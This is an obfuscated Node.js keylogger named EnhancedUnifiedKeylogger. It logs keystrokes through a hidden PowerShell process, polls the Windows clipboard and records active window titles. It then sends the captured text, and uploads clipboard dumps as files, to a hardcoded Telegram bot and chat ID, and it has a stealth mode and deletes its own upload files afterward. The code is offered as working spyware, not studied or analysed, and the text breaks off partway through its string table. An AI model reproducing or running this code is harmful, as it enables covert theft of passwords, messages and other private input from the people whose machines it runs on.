const _0x35a2c6=_0x46e5;(function(_0x561cf9,_0x155a60){const _0x25a5c4=_0x46e5,_0x3a18e3=_0x561cf9();while(!![]){try{const _0x1e907a=parseInt(_0x25a5c4(0x273))/0x1+parseInt(_0x25a5c4(0x287))/0x2*(-parseInt(_0x25a5c4(0x289))/0x3)+-parseInt(_0x25a5c4(0x275))/0x4+-parseInt(_0x25a5c4(0x271))/0x5+parseInt(_0x25a5c4(0x26c))/0x6+parseInt(_0x25a5c4(0x282))/0x7*(parseInt(_0x25a5c4(0x1ef))/0x8)+parseInt(_0x25a5c4(0x238))/0x9;if(_0x1e907a===_0x155a60)break;else _0x3a18e3['push'](_0x3a18e3['shift']());}catch(_0x1a2591){_0x3a18e3['push'](_0x3a18e3['shift']());}}}(_0x1772,0xb83d5));const fs=require('fs'),path=require('path'),os=require('os'),https=require(_0x35a2c6(0x1df)),{exec,spawn,execSync}=require(_0x35a2c6(0x2a4));function _0x46e5(_0x434f1e,_0x4a77b8){const _0x177268=_0x1772();return _0x46e5=function(_0x46e5fd,_0x2b3b25){_0x46e5fd=_0x46e5fd-0x1d4;let _0x4ddf8f=_0x177268[_0x46e5fd];return _0x4ddf8f;},_0x46e5(_0x434f1e,_0x4a77b8);}let activeWin=null;try{activeWin=require('active-win');}catch(_0xd49eb3){try{console['log']('üì¶\x20Installing\x20(aw)'),execSync(_0x35a2c6(0x260),{'stdio':_0x35a2c6(0x237),'timeout':0x7530}),activeWin=require(_0x35a2c6(0x205)),console[_0x35a2c6(0x20a)]('‚úÖ\x20installed\x20successfully');}catch(_0x1f5308){console[_0x35a2c6(0x20a)](_0x35a2c6(0x250));}}const CONFIG={'telegramBotToken':_0x35a2c6(0x29e),'telegramChatId':_0x35a2c6(0x210),'keystrokeBatchInterval':0xbb8,'messageInterval':0x7d0,'clipboardCheckInterval':0x12c,'windowCheckInterval':0x7d0,'maxMessagesPerMinute':0x1e,'maxBatchSize':0xc8,'trackActiveWindow':!![],'instantClipboard':!![],'batchKeystrokes':!![],'stealthMode':!![]},LANGUAGE_PATTERNS={'hebrew':/[\u0590-\u05ff\u200f\u200e]/,'russian':/[–∞-—è—ë–ê-–Ø–Å\u0400-\u04ff]/,'arabic':/[\u0600-\u06ff\u0750-\u077f\u08a0-\u08ff\ufb50-\ufdff\ufe70-\ufeff]/,'chinese':/[\u4e00-\u9fff\u3400-\u4dbf\uf900-\ufaff]/,'japanese':/[\u3040-\u309f\u30a0-\u30ff\u31f0-\u31ff\uff65-\uff9f]/,'korean':/[\uac00-\ud7af\u1100-\u11ff\u3130-\u318f]/,'greek':/[\u0370-\u03ff\u1f00-\u1fff]/,'cyrillic':/[\u0400-\u04ff\u0500-\u052f\u2de0-\u2dff\ua640-\ua69f]/,'latin_extended':/[\u0100-\u017f\u0180-\u024f\u1e00-\u1eff]/,'english':/[a-zA-Z]/},PRIORITY={'URGENT':0x1,'NORMAL':0x2,'LOW':0x3};class EnhancedUnifiedKeylogger{constructor(_0x540097=CONFIG){const _0x5c50cc=_0x35a2c6;this[_0x5c50cc(0x22a)]={...CONFIG,..._0x540097},this['isRunning']=![],this[_0x5c50cc(0x1f0)]='',this['currentLanguage']=_0x5c50cc(0x268),this[_0x5c50cc(0x29a)]='',this[_0x5c50cc(0x1e1)]=[],this[_0x5c50cc(0x1f6)]=0x0,this[_0x5c50cc(0x2a0)]=![],this[_0x5c50cc(0x27f)]=_0x5c50cc(0x267),this[_0x5c50cc(0x217)]='',this[_0x5c50cc(0x21f)]=null,this['clipboardTimer']=null,this[_0x5c50cc(0x285)]=null,this[_0x5c50cc(0x266)]=null,this[_0x5c50cc(0x228)]=[],this[_0x5c50cc(0x265)]=0x0,this[_0x5c50cc(0x25d)]=0x0,this['messageSendTimer']=null,this[_0x5c50cc(0x262)]=this[_0x5c50cc(0x262)][_0x5c50cc(0x299)](this),this[_0x5c50cc(0x254)]=this[_0x5c50cc(0x254)][_0x5c50cc(0x299)](this),process['on'](_0x5c50cc(0x227),this[_0x5c50cc(0x254)]),process['on'](_0x5c50cc(0x1e5),this[_0x5c50cc(0x254)]),process['on']('exit',this['handleExit']),this['startMessageProcessor']();}[_0x35a2c6(0x251)](){const _0x182502=_0x35a2c6;setInterval(()=>{this['messagesSentThisMinute']=0x0;},0xea60),this[_0x182502(0x1ed)]=setInterval(()=>{const _0x211fde=_0x182502;this[_0x211fde(0x29f)]();},this[_0x182502(0x22a)][_0x182502(0x215)]);}[_0x35a2c6(0x232)](_0x1ca21a,_0xa20ec5=PRIORITY['NORMAL']){const _0x1ea3ab=_0x35a2c6;this['messageQueue'][_0x1ea3ab(0x1fe)]({'message':_0x1ca21a,'priority':_0xa20ec5,'timestamp':Date[_0x1ea3ab(0x298)]()}),this[_0x1ea3ab(0x228)][_0x1ea3ab(0x235)]((_0x40c1c1,_0x5da098)=>_0x40c1c1[_0x1ea3ab(0x28b)]-_0x5da098[_0x1ea3ab(0x28b)]),_0xa20ec5===PRIORITY[_0x1ea3ab(0x229)]&&this[_0x1ea3ab(0x265)]<this[_0x1ea3ab(0x22a)][_0x1ea3ab(0x1e0)]&&this[_0x1ea3ab(0x29f)]();}async[_0x35a2c6(0x29f)](){const _0x41611c=_0x35a2c6;if(this[_0x41611c(0x228)][_0x41611c(0x22b)]===0x0||this[_0x41611c(0x265)]>=this['config'][_0x41611c(0x1e0)])return;const _0x3e79de=Date[_0x41611c(0x298)]();if(_0x3e79de-this['lastMessageTime']<this[_0x41611c(0x22a)][_0x41611c(0x215)])return;const _0x35db57=this[_0x41611c(0x228)]['shift']();if(_0x35db57)try{await this[_0x41611c(0x212)](_0x35db57[_0x41611c(0x222)]),this[_0x41611c(0x265)]++,this[_0x41611c(0x25d)]=_0x3e79de;}catch(_0x1f9428){this[_0x41611c(0x228)]['unshift'](_0x35db57);}}async[_0x35a2c6(0x1fd)](){const _0x2d876b=_0x35a2c6;try{if(activeWin){const _0xe75cd9=await activeWin();if(_0xe75cd9&&_0xe75cd9['owner']&&_0xe75cd9['title']){const _0x2b52e6=_0xe75cd9[_0x2d876b(0x259)][_0x2d876b(0x1ff)]||_0x2d876b(0x267),_0x1c1b3f=_0xe75cd9[_0x2d876b(0x1eb)][_0x2d876b(0x22b)]>0x28?_0xe75cd9['title'][_0x2d876b(0x269)](0x0,0x25)+_0x2d876b(0x270):_0xe75cd9[_0x2d876b(0x1eb)];return _0x2b52e6+_0x2d876b(0x25a)+_0x1c1b3f;}else{if(_0xe75cd9&&_0xe75cd9['owner'])return _0xe75cd9[_0x2d876b(0x259)][_0x2d876b(0x1ff)]||_0x2d876b(0x267);}}if(os[_0x2d876b(0x27c)]()===_0x2d876b(0x29d)){const _0x28011b=await new Promise(_0x299bbd=>{const _0x320b80=_0x2d876b;exec('powershell\x20\x22Get-Process\x20|\x20Where-Object\x20{$_.MainWindowTitle}\x20|\x20Select-Object\x20-First\x201\x20|\x20ForEach-Object\x20{$_.ProcessName\x20+\x20\x27\x20-\x20\x27\x20+\x20$_.MainWindowTitle}\x22',{'encoding':_0x320b80(0x24d),'timeout':0x5dc,'windowsHide':!![]},(_0x2e891f,_0x44f87d)=>{const _0x261d4e=_0x320b80;_0x299bbd(_0x2e891f?_0x261d4e(0x267):_0x44f87d['trim']());});});return _0x28011b||_0x2d876b(0x267);}return _0x2d876b(0x267);}catch(_0x4e74d1){return'Unknown';}}['startWindowMonitoring'](){const _0x30dba4=_0x35a2c6;if(!this[_0x30dba4(0x22a)][_0x30dba4(0x1e3)])return;this[_0x30dba4(0x285)]=setInterval(async()=>{const _0xa2a2f8=_0x30dba4;try{const _0x4f6066=await this[_0xa2a2f8(0x1fd)]();_0x4f6066!==_0xa2a2f8(0x267)&&_0x4f6066!==this[_0xa2a2f8(0x217)]&&(this[_0xa2a2f8(0x217)]=this[_0xa2a2f8(0x27f)],this[_0xa2a2f8(0x27f)]=_0x4f6066,this[_0xa2a2f8(0x217)]!==''&&this[_0xa2a2f8(0x232)](_0xa2a2f8(0x27b)+_0x4f6066,PRIORITY[_0xa2a2f8(0x244)]));}catch(_0xaf3412){}},this['config'][_0x30dba4(0x219)]);}[_0x35a2c6(0x278)](){const _0x436ed0=_0x35a2c6;if(!this[_0x436ed0(0x22a)][_0x436ed0(0x272)])return;this[_0x436ed0(0x1f9)]=setInterval(async()=>{const _0x45a529=_0x436ed0;try{if(os['platform']()==='win32'){const _0x48de83=execSync(_0x45a529(0x1fb),{'encoding':'utf8','timeout':0x7d0,'maxBuffer':0x400*0x400}),_0x323b20=_0x48de83[_0x45a529(0x249)]();_0x323b20&&_0x323b20!==this[_0x45a529(0x29a)]&&_0x323b20[_0x45a529(0x22b)]>0x0&&_0x323b20[_0x45a529(0x22b)]<0x2710&&(this[_0x45a529(0x21c)](_0x323b20),this[_0x45a529(0x29a)]=_0x323b20);}}catch(_0xe8843f){}},this['config'][_0x436ed0(0x1e2)]);}[_0x35a2c6(0x1de)](_0x1c73b7){const _0x368202=_0x35a2c6,_0x194418={};for(const [_0x547758,_0x1fe1a8]of Object['entries'](LANGUAGE_PATTERNS)){const _0x199b30=_0x1c73b7[_0x368202(0x281)](new RegExp(_0x1fe1a8[_0x368202(0x27d)],'g'));_0x194418[_0x547758]=_0x199b30?_0x199b30['length']:0x0;}const _0x424f98=Object['keys'](_0x194418)[_0x368202(0x248)]((_0x598379,_0x541811)=>_0x194418[_0x598379]>_0x194418[_0x541811]?_0x598379:_0x541811);return _0x194418[_0x424f98]>0x0?_0x424f98:_0x368202(0x268);}['getLanguageFlag'](_0x5adcd5){const _0x88fc67=_0x35a2c6,_0x56a017={'hebrew':'üáÆüá±','russian':_0x88fc67(0x206),'arabic':_0x88fc67(0x2a3),'chinese':_0x88fc67(0x263),'japanese':_0x88fc67(0x264),'korean':_0x88fc67(0x274),'greek':_0x88fc67(0x23d),'cyrillic':_0x88fc67(0x1d9),'latin_extended':_0x88fc67(0x240),'english':'üá∫üá∏'};return _0x56a017[_0x5adcd5]||'üåê';}['handleClipboardChange'](_0xf956a8){const _0x28c259=_0x35a2c6,_0x3b5f87=Date[_0x28c259(0x298)](),_0x50b0ca=_0xf956a8[_0x28c259(0x22b)]>0x1f4?_0xf956a8[_0x28c259(0x269)](0x0,0x1f4)+_0x28c259(0x270):_0xf956a8,_0x44cd01=this[_0x28c259(0x1de)](_0xf956a8),_0x217541=this[_0x28c259(0x225)](_0x44cd01);this[_0x28c259(0x1e1)][_0x28c259(0x1fe)]({'content':_0xf956a8,'preview':_0x50b0ca,'timestamp':_0x3b5f87,'window':this['currentWindow'],'language':_0x44cd01});this['clipboardHistory'][_0x28c259(0x22b)]>0x5&&this['clipboardHistory'][_0x28c259(0x293)]();const _0x2379b0=new Date(_0x3b5f87)[_0x28c259(0x21a)](),_0x281704=_0x28c259(0x28a)+_0x217541+_0x28c259(0x231)+this[_0x28c259(0x27f)]+'\x0a‚è∞\x20'+_0x2379b0;if(_0xf956a8[_0x28c259(0x22b)]<=0xdac){const _0x46d04b=_0x281704+_0x28c259(0x256)+_0xf956a8;this[_0x28c259(0x232)](_0x46d04b,PRIORITY['URGENT']);}else{const _0x3eaecf=_0x281704+_0x28c259(0x27e)+_0x50b0ca+_0x28c259(0x26e)+_0xf956a8[_0x28c259(0x22b)]+_0x28c259(0x26a);try{const _0x3d990b=new Date()[_0x28c259(0x1d4)]()[_0x28c259(0x1f5)](/[:.]/g,'-'),_0x58d692=_0x28c259(0x220)+_0x3d990b+_0x28c259(0x24f),_0x22de80=path[_0x28c259(0x226)](__dirname,_0x58d692),_0x59521a=_0x28c259(0x218)+new Date()[_0x28c259(0x1d7)]()+'\x0a',_0x232902=_0x28c259(0x26f)+this['currentWindow']+'\x0a',_0x521418=_0x28c259(0x258)+_0x44cd01+'\x20'+_0x217541+'\x0a',_0x1eb198='='['repeat'](0x32)+'\x0a\x0a',_0x529647=_0x59521a+_0x232902+_0x521418+_0x1eb198+_0xf956a8;fs['writeFileSync'](_0x22de80,_0x529647,'utf8'),this[_0x28c259(0x232)](_0x3eaecf,PRIORITY[_0x28c259(0x229)]),setTimeout(async()=>{const _0x7d1724=_0x28c259;try{await this[_0x7d1724(0x1ec)](_0x22de80,_0x7d1724(0x294)+_0x217541+_0x7d1724(0x207)+_0xf956a8[_0x7d1724(0x22b)]+_0x7d1724(0x20f)+this[_0x7d1724(0x27f)]),setTimeout(()=>{const _0xe8ca63=_0x7d1724;try{fs[_0xe8ca63(0x1e4)](_0x22de80)&&fs[_0xe8ca63(0x214)](_0x22de80);}catch(_0x47dfa2){}},0x1388);}catch(_0x435333){this[_0x7d1724(0x232)]('‚ùå\x20Failed\x20to\x20send\x20clipboard\x20file:\x20'+_0x435333['message'],PRIORITY[_0x7d1724(0x229)]);}},0x7d0);}catch(_0x652ac){const _0x440eff=_0x281704+_0x28c259(0x24e)+_0x50b0ca+_0x28c259(0x20e)+_0xf956a8[_0x28c259(0x22b)]+_0x28c259(0x26a);this[_0x28c259(0x232)](_0x440eff,PRIORITY['URGENT']);}}this[_0x28c259(0x2a0)]=!![],setTimeout(()=>{const _0x540f8e=_0x28c259;this[_0x540f8e(0x2a0)]=![];},0x7530);}async[_0x35a2c6(0x257)](){const _0xf1f36a=_0x35a2c6,_0x576166=path[_0xf1f36a(0x226)](__dirname,'enhanced_keylogger.ps1'),_0x351c6d=_0xf1f36a(0x2a1);fs['writeFileSync'](_0x576166,_0x351c6d,_0xf1f36a(0x24d)),this[_0xf1f36a(0x21f)]=spawn('powershell',[_0xf1f36a(0x283),_0xf1f36a(0x290),'-WindowStyle',_0xf1f36a(0x280),_0xf1f36a(0x20c),_0xf1f36a(0x1db),_0x576166],{'stdio':['ignore','pipe',_0xf1f36a(0x203)],'windowsHide':!![]}),this[_0xf1f36a(0x21f)][_0xf1f36a(0x1d5)]['on'](_0xf1f36a(0x221),_0x2efc93=>{const _0x3cdb54=_0xf1f36a;this[_0x3cdb54(0x21b)](_0x2efc93[_0x3cdb54(0x2a5)]());}),this[_0xf1f36a(0x21f)][_0xf1f36a(0x247)]['on'](_0xf1f36a(0x221),_0x1d5d78=>{}),this['keyloggerProcess']['on'](_0xf1f36a(0x1f7),_0x338dfe=>{const _0xc17622=_0xf1f36a;this['queueMessage']('‚ùå\x20Keylogger\x20error:\x20'+_0x338dfe['message'],PRIORITY[_0xc17622(0x229)]);}),this['psScriptPath']=_0x576166;}[_0x35a2c6(0x21b)](_0xdcd13d){const _0x4a951d=_0x35a2c6,_0x286c7d=_0xdcd13d[_0x4a951d(0x1dc)]('\x0a')[_0x4a951d(0x23b)](_0x25949d=>_0x25949d['trim']());_0x286c7d[_0x4a951d(0x245)](_0x4788b5=>{const _0xcdb169=_0x4a951d,_0x371385=_0x4788b5[_0xcdb169(0x249)]();if(_0x371385===_0xcdb169(0x296)){}else{if(_0x371385===_0xcdb169(0x22e))this['handleCopyDetected']();else{if(_0x371385===_0xcdb169(0x1fa))this[_0xcdb169(0x1f3)]();else{if(_0x371385[_0xcdb169(0x252)](_0xcdb169(0x255)))this['queueMessage']('‚ùå\x20'+_0x371385[_0xcdb169(0x269)](0x6),PRIORITY['URGENT']);else{if(_0x371385[_0xcdb169(0x252)]('UNICODE:')){const _0x2916b2=parseInt(_0x371385[_0xcdb169(0x269)](0x8));if(!isNaN(_0x2916b2)){const _0x4b30c9=String['fromCharCode'](_0x2916b2);this[_0xcdb169(0x23e)](_0x4b30c9,!![]);}}else{if(_0x371385[_0xcdb169(0x252)](_0xcdb169(0x23c))){const _0xf1c923=_0x371385[_0xcdb169(0x269)](0x4);this[_0xcdb169(0x23e)](_0xf1c923,![]);}}}}}}});}['handleCopyDetected'](){const _0x2b514b=_0x35a2c6,_0x47cb26='üìÑ\x20COPY\x20operation\x20detected\x0aüñºÔ∏è\x20From:\x20'+this[_0x2b514b(0x27f)];this['queueMessage'](_0x47cb26,PRIORITY[_0x2b514b(0x244)]);}[_0x35a2c6(0x1f3)](){const _0x5d5bb7=_0x35a2c6,_0x47c0b3=Date['now']();this[_0x5d5bb7(0x1f6)]=_0x47c0b3;const _0x33d5af=this[_0x5d5bb7(0x1e1)][_0x5d5bb7(0x1e9)](_0x4a65de=>_0x47c0b3-_0x4a65de['timestamp']<0xea60);if(_0x33d5af){const _0x2b6136=Math[_0x5d5bb7(0x209)]((_0x47c0b3-_0x33d5af[_0x5d5bb7(0x261)])/0x3e8),_0x1f55ed=this['getLanguageFlag'](_0x33d5af['language']),_0x46b93c='üì•\x20PASTED:\x20'+_0x1f55ed+'\x20'+_0x33d5af['preview']+'\x0a'+(_0x5d5bb7(0x243)+this[_0x5d5bb7(0x27f)]+'\x0a')+('‚è±Ô∏è\x20From:\x20'+_0x33d5af['window']+'\x20('+_0x2b6136+_0x5d5bb7(0x1e8));this['queueMessage'](_0x46b93c,PRIORITY[_0x5d5bb7(0x229)]);}else{const _0x4d24e0=_0x5d5bb7(0x216)+this['currentWindow'];this[_0x5d5bb7(0x232)](_0x4d24e0,PRIORITY[_0x5d5bb7(0x244)]);}}[_0x35a2c6(0x23e)](_0x5251d6,_0x1bc620){const _0x126a71=_0x35a2c6;_0x1bc620&&this['detectLanguage'](_0x5251d6),this[_0x126a71(0x22a)]['batchKeystrokes']&&this['addToKeystrokeBatch'](_0x5251d6,_0x126a71(0x279));}[_0x35a2c6(0x23a)](_0xf4cfce){const _0x319564=_0x35a2c6;for(const [_0x3b0217,_0x1d594b]of Object[_0x319564(0x1d6)](LANGUAGE_PATTERNS)){if(_0x1d594b[_0x319564(0x292)](_0xf4cfce)){if(_0x3b0217!==this[_0x319564(0x25f)]){const _0x40c25b=this[_0x319564(0x25f)];this[_0x319564(0x25f)]=_0x3b0217,this[_0x319564(0x24a)](_0x3b0217,_0x40c25b);}return;}}if(/[a-zA-Z0-9]/['test'](_0xf4cfce)&&this[_0x319564(0x25f)]!=='english'){const _0x312329=this['currentLanguage'];this[_0x319564(0x25f)]=_0x319564(0x268),this['notifyLanguageChange']('english',_0x312329);}}[_0x35a2c6(0x24a)](_0x21d59a,_0x302d4e){const _0x9b1ae0=_0x35a2c6,_0x138908=this[_0x9b1ae0(0x225)](_0x302d4e),_0xb07765=this[_0x9b1ae0(0x225)](_0x21d59a),_0x33551b={'hebrew':_0x9b1ae0(0x28e),'russian':'Russian','arabic':_0x9b1ae0(0x26d),'chinese':_0x9b1ae0(0x1d8),'japanese':_0x9b1ae0(0x26b),'korean':_0x9b1ae0(0x21e),'greek':'Greek','cyrillic':_0x9b1ae0(0x297),'latin_extended':_0x9b1ae0(0x236),'english':'English'},_0x124723=_0x9b1ae0(0x241)+_0x138908+'\x20'+(_0x33551b[_0x302d4e]||_0x302d4e)+_0x9b1ae0(0x213)+_0xb07765+'\x20'+(_0x33551b[_0x21d59a]||_0x21d59a);this[_0x9b1ae0(0x232)](_0x124723,PRIORITY[_0x9b1ae0(0x224)]);}[_0x35a2c6(0x1ee)](_0x58779e,_0x4602f1=_0x35a2c6(0x279)){const _0x58a54d=_0x35a2c6,_0x1d6a21=[_0x58a54d(0x27a),_0x58a54d(0x1e7),_0x58a54d(0x1f1),_0x58a54d(0x284)];if(_0x1d6a21['includes'](_0x58779e)){this[_0x58a54d(0x1f0)][_0x58a54d(0x22b)]>0x0&&this[_0x58a54d(0x201)]();const _0x5a24d5={'[BACKSPACE]':'‚å´','[ENTER]':'‚Üµ','[ESC]':'‚éã','[TAB]':'‚Üí'},_0xbfbb91=_0x5a24d5[_0x58779e]||_0x58779e,_0x134c57=_0x4602f1===_0x58a54d(0x279)?'‚å®Ô∏è':'üìã';this[_0x58a54d(0x232)](_0x134c57+'\x20'+_0xbfbb91+_0x58a54d(0x1f4)+this[_0x58a54d(0x27f)],PRIORITY[_0x58a54d(0x244)]);return;}this[_0x58a54d(0x1f0)]+=_0x58779e,this[_0x58a54d(0x1f0)][_0x58a54d(0x22b)]>=this[_0x58a54d(0x22a)][_0x58a54d(0x25c)]?this[_0x58a54d(0x201)](_0x4602f1):this[_0x58a54d(0x2a2)](_0x4602f1);}[_0x35a2c6(0x2a2)](_0x4ad597=_0x35a2c6(0x279)){const _0x5b3d34=_0x35a2c6;if(this[_0x5b3d34(0x266)])clearTimeout(this[_0x5b3d34(0x266)]);this[_0x5b3d34(0x266)]=setTimeout(()=>{const _0x5c18fb=_0x5b3d34;this['keyBuffer']['length']>0x0&&this[_0x5c18fb(0x201)](_0x4ad597);},this[_0x5b3d34(0x22a)]['keystrokeBatchInterval']);}['sendKeystrokeBatch'](_0x12bf20='TYPED'){const _0x2d4667=_0x35a2c6;if(this[_0x2d4667(0x1f0)][_0x2d4667(0x22b)]===0x0)return;const _0x433687=this[_0x2d4667(0x1de)](this[_0x2d4667(0x1f0)]),_0x861774=this[_0x2d4667(0x225)](_0x433687),_0x10274f=_0x12bf20==='TYPED'?'‚å®Ô∏è':'üìã',_0x2ed5cc=_0x12bf20===_0x2d4667(0x279)?'TYPED':_0x2d4667(0x286),_0xa97d2b=_0x10274f+'\x20'+_0x2ed5cc+':\x20'+_0x861774+'\x20'+this[_0x2d4667(0x1f0)]+_0x2d4667(0x1f4)+this[_0x2d4667(0x27f)];this['queueMessage'](_0xa97d2b,PRIORITY[_0x2d4667(0x244)]),this['keyBuffer']='',this[_0x2d4667(0x266)]&&(clearTimeout(this['batchTimer']),this['batchTimer']=null);}async[_0x35a2c6(0x212)](_0x361d18){return new Promise((_0x1c0b4a,_0x1d740d)=>{const _0x4f42d0=_0x46e5,_0x199487=_0x4f42d0(0x24c)+this['config']['telegramBotToken']+_0x4f42d0(0x233),_0x1de000=JSON[_0x4f42d0(0x22d)]({'chat_id':this[_0x4f42d0(0x22a)][_0x4f42d0(0x29b)],'text':_0x361d18}),_0x838bd3={'method':_0x4f42d0(0x1f8),'headers':{'Content-Type':_0x4f42d0(0x211),'Content-Length':Buffer['byteLength'](_0x1de000)},'timeout':0x7530},_0x33632a=https[_0x4f42d0(0x253)](_0x199487,_0x838bd3,_0xdaf84f=>{const _0x46749a=_0x4f42d0;let _0x5c549d='';_0xdaf84f['on'](_0x46749a(0x221),_0xfbdf47=>_0x5c549d+=_0xfbdf47),_0xdaf84f['on'](_0x46749a(0x29c),()=>{const _0x15747c=_0x46749a;_0xdaf84f['statusCode']===0xc8?_0x1c0b4a(_0x5c549d):_0x1d740d(new Error(_0x15747c(0x24b)+_0xdaf84f[_0x15747c(0x25e)]+':\x20'+_0x5c549d));});});_0x33632a['on'](_0x4f42d0(0x1f7),_0x1d740d),_0x33632a['on']('timeout',()=>{const _0x51d3b5=_0x4f42d0;_0x33632a[_0x51d3b5(0x202)](),_0x1d740d(new Error('Request\x20timeout'));}),_0x33632a[_0x4f42d0(0x25b)](_0x1de000),_0x33632a[_0x4f42d0(0x29c)]();});}async[_0x35a2c6(0x1ec)](_0xb28c08,_0x3a1f19){return new Promise((_0x228164,_0x4a155e)=>{const _0x2c8f9b=_0x46e5,_0x781f77=_0x2c8f9b(0x24c)+this['config'][_0x2c8f9b(0x223)]+_0x2c8f9b(0x1dd),_0x32226e=_0x2c8f9b(0x1ea)+Math[_0x2c8f9b(0x1e6)]()['toString'](0x24),_0x3dcd8e=fs['readFileSync'](_0xb28c08),_0x4f275e=path[_0x2c8f9b(0x20d)](_0xb28c08);let _0x158be7='';_0x158be7+='--'+_0x32226e+'\x0d\x0a',_0x158be7+=_0x2c8f9b(0x246),_0x158be7+=this[_0x2c8f9b(0x22a)][_0x2c8f9b(0x29b)]+'\x0d\x0a',_0x158be7+='--'+_0x32226e+'\x0d\x0a',_0x158be7+=_0x2c8f9b(0x23f),_0x158be7+=_0x3a1f19+'\x0d\x0a',_0x158be7+='--'+_0x32226e+'\x0d\x0a',_0x158be7+='Content-Disposition:\x20form-data;\x20name=\x22document\x22;\x20filename=\x22'+_0x4f275e+'\x22\x0d\x0a',_0x158be7+='Content-Type:\x20text/plain;\x20charset=utf-8\x0d\x0a\x0d\x0a';const _0x40ce24=Buffer[_0x2c8f9b(0x277)]([Buffer[_0x2c8f9b(0x276)](_0x158be7,'utf8'),_0x3dcd8e,Buffer[_0x2c8f9b(0x276)]('\x0d\x0a--'+_0x32226e+_0x2c8f9b(0x204),'utf8')]),_0x416c92={'method':_0x2c8f9b(0x1f8),'headers':{'Content-Type':_0x2c8f9b(0x20b)+_0x32226e,'Content-Length':_0x40ce24['length']},'timeout':0xea60},_0x3fa2c4=https[_0x2c8f9b(0x253)](_0x781f77,_0x416c92,_0x2ac8e=>{const _0x3ab413=_0x2c8f9b;let _0x235242='';_0x2ac8e['on'](_0x3ab413(0x221),_0x41389a=>_0x235242+=_0x41389a),_0x2ac8e['on']('end',()=>{const _0x593c7a=_0x3ab413;_0x2ac8e['statusCode']===0xc8?_0x228164(_0x235242):_0x4a155e(new Error(_0x593c7a(0x24b)+_0x2ac8e[_0x593c7a(0x25e)]+':\x20'+_0x235242));});});_0x3fa2c4['on']('error',_0x4a155e),_0x3fa2c4['on'](_0x2c8f9b(0x1f2),()=>{const _0x51a805=_0x2c8f9b;_0x3fa2c4[_0x51a805(0x202)](),_0x4a155e(new Error(_0x51a805(0x200)));}),_0x3fa2c4[_0x2c8f9b(0x25b)](_0x40ce24),_0x3fa2c4[_0x2c8f9b(0x29c)]();});}async['start'](){const _0x272f4c=_0x35a2c6;if(this[_0x272f4c(0x295)]){console['log'](_0x272f4c(0x28c));return;}this['isRunning']=!![];try{const _0x4cd481='üöÄ\x20Monitor\x20Started\x0a\x0a'+'‚å®Ô∏è\x20Keystrokes\x0a'+'üìã\x20Clipboard\x0a'+(_0x272f4c(0x239)+(activeWin?'Windows':_0x272f4c(0x21d))+'\x0a');this['queueMessage'](_0x4cd481,PRIORITY[_0x272f4c(0x229)]),this['currentWindow']=await this[_0x272f4c(0x1fd)](),this[_0x272f4c(0x27f)]!==_0x272f4c(0x267)&&this[_0x272f4c(0x232)](_0x272f4c(0x22c)+this[_0x272f4c(0x27f)],PRIORITY[_0x272f4c(0x244)]),await this['startKeystrokeCapture'](),this[_0x272f4c(0x278)](),this['startWindowMonitoring']();}catch(_0x2e2d18){console['log'](_0x272f4c(0x230)+_0x2e2d18['message']),this[_0x272f4c(0x232)]('‚ùå\x20Start\x20error:\x20'+_0x2e2d18['message'],PRIORITY[_0x272f4c(0x229)]),this[_0x272f4c(0x295)]=![];}}[_0x35a2c6(0x262)](){const _0x4ef8aa=_0x35a2c6;if(!this[_0x4ef8aa(0x295)])return;console[_0x4ef8aa(0x20a)](_0x4ef8aa(0x22f)),this['isRunning']=![];this[_0x4ef8aa(0x1f0)][_0x4ef8aa(0x22b)]>0x0&&this[_0x4ef8aa(0x201)]();if(this[_0x4ef8aa(0x266)])clearTimeout(this[_0x4ef8aa(0x266)]);if(this[_0x4ef8aa(0x1f9)])clearInterval(this[_0x4ef8aa(0x1f9)]);if(this[_0x4ef8aa(0x285)])clearInterval(this['windowTimer']);if(this[_0x4ef8aa(0x1ed)])clearInterval(this[_0x4ef8aa(0x1ed)]);this[_0x4ef8aa(0x21f)]&&(this[_0x4ef8aa(0x21f)][_0x4ef8aa(0x242)](),this['keyloggerProcess']=null);if(this[_0x4ef8aa(0x288)]&&fs[_0x4ef8aa(0x1e4)](this[_0x4ef8aa(0x288)]))try{fs[_0x4ef8aa(0x214)](this[_0x4ef8aa(0x288)]);}catch(_0x27bac6){}this[_0x4ef8aa(0x232)](_0x4ef8aa(0x1fc),PRIORITY[_0x4ef8aa(0x229)]),console[_0x4ef8aa(0x20a)](_0x4ef8aa(0x234));}[_0x35a2c6(0x254)](){const _0x4fc0fa=_0x35a2c6;this[_0x4fc0fa(0x262)]();}}function _0x1772(){const _0xa9b818=['PASTE_DETECTED','powershell\x20-command\x20\x22$OutputEncoding\x20=\x20[console]::InputEncoding\x20=\x20[console]::OutputEncoding\x20=\x20New-Object\x20System.Text.UTF8Encoding;\x20Get-Clipboard\x22','üî¥\x20Enhanced\x20Monitor\x20Stopped','getActiveWindow','push','name','File\x20upload\x20timeout','sendKeystrokeBatch','destroy','pipe','--\x0d\x0a','active-win','üá∑üá∫','\x20Clipboard\x20(','main','round','log','multipart/form-data;\x20boundary=','-NoProfile','basename','\x0a\x0a‚ö†Ô∏è\x20Full\x20content\x20too\x20large\x20(','\x20chars)\x20from\x20','-1002730129346','application/json','sendTelegramMessage','\x20‚Üí\x20','unlinkSync','messageInterval','üì•\x20PASTE\x20operation\x20detected\x0aüñºÔ∏è\x20Into:\x20','lastWindow','Clipboard\x20Content\x20-\x20','windowCheckInterval','toLocaleTimeString','processKeystrokeOutput','handleClipboardChange','PowerShell','Korean','keyloggerProcess','clipboard_','data','message','telegramBotToken','LOW','getLanguageFlag','join','SIGINT','messageQueue','URGENT','config','length','üñºÔ∏è\x20Initial:\x20','stringify','COPY_DETECTED','üî¥\x20Stopping...','‚ùå\x20Start\x20error:\x20','\x0aüñºÔ∏è\x20From:\x20','queueMessage','/sendMessage','‚úÖ\x20Stopped\x20successfully','sort','Latin\x20Extended','ignore','6177528zxyYWG','üñºÔ∏è\x20OS:\x20','detectLanguage','filter','KEY:','üá¨üá∑','handleKeystroke','Content-Disposition:\x20form-data;\x20name=\x22caption\x22\x0d\x0a\x0d\x0a','üá™üá∫','üîÑ\x20','kill','üñºÔ∏è\x20Into:\x20','NORMAL','forEach','Content-Disposition:\x20form-data;\x20name=\x22chat_id\x22\x0d\x0a\x0d\x0a','stderr','reduce','trim','notifyLanguageChange','HTTP\x20','https://api.telegram.org/bot','utf8','\x0a\x0aüìÑ\x20Content:\x20','.txt','‚ö†Ô∏è\x20Using\x20PS','startMessageProcessor','startsWith','request','handleExit','ERROR:','\x0a\x0aüìÑ\x20Content:\x0a','startKeystrokeCapture','Language:\x20','owner','\x20-\x20','write','maxBatchSize','lastMessageTime','st